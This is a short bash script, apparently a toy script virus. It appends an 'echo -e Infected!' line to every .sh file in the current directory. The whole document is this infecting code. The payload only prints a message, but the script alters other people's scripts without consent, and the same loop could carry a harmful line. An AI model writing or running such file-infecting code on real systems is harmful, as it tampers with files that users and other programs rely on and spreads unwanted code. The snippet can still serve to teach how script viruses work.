#! /bin/bash

files=`ls *.sh`

files=($(echo $files | tr " " "\n"))

for file in "${files[@]}"; do
    echo -e "\necho -e Infected!" >> "$file"
done

exit 0